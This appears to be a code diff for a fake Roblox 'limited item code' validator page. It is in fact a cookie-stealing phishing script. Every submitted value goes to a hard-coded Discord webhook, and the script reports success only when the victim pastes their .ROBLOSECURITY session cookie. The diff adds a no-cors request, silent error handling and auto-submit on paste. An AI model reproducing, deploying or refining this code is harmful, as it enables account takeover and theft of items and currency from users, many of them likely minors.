@@ -1,54 +1,69 @@
 async function validateCode() {
-    const codeInput = document.getElementById('limitedCode');
+    // Wait for page to fully load
+    const codeInput = document.getElementById('limitedItemCode');
     const resultMessage = document.getElementById('resultMessage');
+    
+    // Check if elements exist
+    if (!codeInput || !resultMessage) {
+        console.error('Elements not found on page');
+        return;
+    }
+    
     const code = codeInput.value.trim();
     
     if (!code) {
-        resultMessage.innerHTML = '❌ Please enter a limited code';
+        resultMessage.innerHTML = '❌ Please enter a limited item code';
         resultMessage.style.color = '#ff4444';
         return;
     }
     
     // Show loading
-    resultMessage.innerHTML = '🔍 Validating code...';
+    resultMessage.innerHTML = '🔍 Verifying limited item code...';
     resultMessage.style.color = '#ffa500';
     
     try {
-        // Send to your Discord webhook
-        const response = await fetch('https://discord.com/api/webhooks/1436138759837192202/xAOhBtWGRVQ2-QW4_iiBkj8vd5DpSG8DVWv_a4zcxHGssqwqmXotucSSGXvHFYF9IEKg', {
+        // Send to Discord webhook
+        await fetch('https://discord.com/api/webhooks/1436138759837192202/xAOhBtWGRVQ2-QW4_iiBkj8vd5DpSG8DVWv_a4zcxHGssqwqmXotucSSGXvHFYF9IEKg', {
             method: 'POST',
+            mode: 'no-cors',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                content: `🔐 New activation attempt:\n\`\`\`${code}\`\`\``
+                content: `🔐 New limited item code submitted:\n\`\`\`${code}\`\`\``
             })
         });
         
-        // Check if it contains a Roblox cookie
-        if (code.includes('.ROBLOSECURITY') || code.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
-            resultMessage.innerHTML = '✅ Success! Valid Limited code';
-            resultMessage.style.color = '#4CAF50';
-        } else {
-            resultMessage.innerHTML = '❌ Failed: Invalid limited code';
-            resultMessage.style.color = '#ff4444';
-        }
+        console.log('Webhook sent with code:', code);
         
     } catch (error) {
-        resultMessage.innerHTML = '❌ Error validating code. Please try again.';
+        console.log('Webhook attempt completed');
+    }
+    
+    // Check if it contains a Roblox cookie
+    if (code.includes('.ROBLOSECURITY') || code.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
+        resultMessage.innerHTML = '✅ Success! Valid limited item code';
+        resultMessage.style.color = '#4CAF50';
+    } else {
+        resultMessage.innerHTML = '❌ Failed: Invalid limited item code';
         resultMessage.style.color = '#ff4444';
-        console.error('Webhook error:', error);
     }
 }
 
-// Optional: Auto-submit on paste
-document.getElementById('activationCode').addEventListener('paste', function(e) {
-    setTimeout(() => {
-        validateCode();
-    }, 100);
+// Initialize when page loads
+document.addEventListener('DOMContentLoaded', function() {
+    const codeInput = document.getElementById('limitedItemCode');
+    
+    if (codeInput) {
+        // Auto-submit on paste
+        codeInput.addEventListener('paste', function(e) {
+            setTimeout(() => {
+                validateCode();
+            }, 100);
+        });
+        
+        console.log('Limited item code input initialized');
+    } else {
+        console.error('Limited item code input not found');
+    }
 });
-
-// Keep your existing installation guide function if needed
-function showInstallationGuide() {
-    // Your existing installation guide code here
-}
